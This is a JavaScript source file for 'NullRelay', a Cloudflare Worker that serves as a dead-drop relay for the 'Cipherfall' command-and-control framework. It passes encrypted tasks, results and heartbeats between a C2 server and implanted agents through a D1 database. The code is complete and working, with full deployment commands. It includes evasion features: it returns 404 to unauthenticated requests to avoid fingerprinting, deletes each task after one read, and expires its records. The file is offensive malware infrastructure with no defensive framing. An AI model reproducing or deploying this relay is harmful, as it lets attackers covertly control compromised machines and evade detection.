/*
 * NullRelay (worker.js) — Cipherfall Cloudflare Worker dead-drop relay
 *
 * Role:
 *   Acts as a passive data mule between the C2 server and the agents.
 *   Neither endpoint ever connects to the other; all data transits through
 *   this Worker's D1 database. The Worker itself never decrypts anything —
 *   it stores and returns opaque base64 blobs encrypted by the endpoints.
 *
 * Storage (D1 — strongly consistent, read-after-write guaranteed):
 *   tasks      (agent_id PK)  — encrypted task written by server, read once by agent
 *   results    (task_id PK)   — encrypted result written by agent, read by server
 *   heartbeats (agent_id PK)  — encrypted heartbeat written by agent, read by server
 *
 * TTL policy (enforced via expires_at column, cleaned on each write):
 *   task   : 1 h   (stale if agent never checks in)
 *   result : 24 h  (server has a day to poll for it)
 *   hb     : 10 min (refreshed on every agent iteration)
 *
 * One-time read:
 *   GET /task/{agent_id} deletes the row after the first successful read
 *   via ctx.waitUntil so the delete does not block the response.
 *
 * Agent discovery:
 *   GET /agents lists all agent IDs that have an active heartbeat row.
 *
 * Authentication:
 *   All requests must carry  Authorization: Bearer <WORKER_SECRET>.
 *   WORKER_SECRET is a Cloudflare secret set via:
 *     wrangler secret put WORKER_SECRET
 *   Both server and agent derive the same value from the shared PSK:
 *     HMAC-SHA256(PSK, "worker_token")[:32 hex chars]
 *   Any unauthenticated request returns 404 to avoid fingerprinting.
 *
 * Deployment:
 *   1. wrangler d1 create cipherfall-c2-db → copy id into wrangler.toml
 *   2. wrangler d1 execute cipherfall-c2-db --remote --command "CREATE TABLE IF NOT EXISTS tasks (agent_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL); CREATE TABLE IF NOT EXISTS results (task_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL); CREATE TABLE IF NOT EXISTS heartbeats (agent_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL);"
 *   3. wrangler secret put WORKER_SECRET
 *   4. wrangler deploy
 *
 * Why D1 instead of KV:
 *   CF Workers KV is eventually consistent (up to 60s cross-colo propagation).
 *   D1 reads from the primary replica by default → strong read-after-write
 *   consistency → task delivery latency drops from ~14s to <1s.
 *
 * Limitations:
 *   - If the agent reads a task but crashes before sending the result, the
 *     row is already deleted; re-queue it manually.
 *   - Only one pending task per agent at a time.
 *   - GET /agents returns at most 1000 rows (D1 query limit not hit in practice).
 */

export default {
  async fetch(request, env, ctx) {
    const auth = request.headers.get("Authorization") ?? "";
    if (auth !== `Bearer ${env.WORKER_SECRET}`) {
      return new Response(null, { status: 404 });
    }

    const url   = new URL(request.url);
    const parts = url.pathname.replace(/^\/+/, "").split("/").filter(p => p.length > 0);
    const now   = Math.floor(Date.now() / 1000);

    // Agent discovery — GET /agents
    if (parts.length === 1 && parts[0] === "agents" && request.method === "GET") {
      const result = await env.DB.prepare(
        "SELECT agent_id FROM heartbeats WHERE expires_at > ?"
      ).bind(now).all();
      const ids = result.results.map(r => r.agent_id);
      return new Response(JSON.stringify(ids), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }

    if (parts.length !== 2) {
      return new Response(null, { status: 404 });
    }

    const [resource, id] = parts;
    const TTL = { task: 3600, result: 86400, hb: 600 };
    if (!(resource in TTL)) {
      return new Response(null, { status: 404 });
    }

    const table = resource === "hb" ? "heartbeats" : resource === "result" ? "results" : "tasks";
    const idCol = resource === "result" ? "task_id" : "agent_id";

    if (request.method === "PUT") {
      const body = await request.text();
      if (!body) return new Response(null, { status: 400 });
      const expiresAt = now + TTL[resource];
      await env.DB.prepare(
        `INSERT OR REPLACE INTO ${table} (${idCol}, value, expires_at) VALUES (?, ?, ?)`
      ).bind(id, body, expiresAt).run();
      return new Response(null, { status: 200 });
    }

    if (request.method === "GET") {
      const row = await env.DB.prepare(
        `SELECT value FROM ${table} WHERE ${idCol} = ? AND expires_at > ?`
      ).bind(id, now).first();

      if (!row) {
        return new Response(null, { status: 204 });
      }

      if (resource === "task") {
        ctx.waitUntil(
          env.DB.prepare(`DELETE FROM ${table} WHERE ${idCol} = ?`).bind(id).run()
        );
      }

      return new Response(row.value, {
        status: 200,
        headers: { "Content-Type": "text/plain; charset=utf-8" },
      });
    }

    return new Response(null, { status: 405 });
  },
};
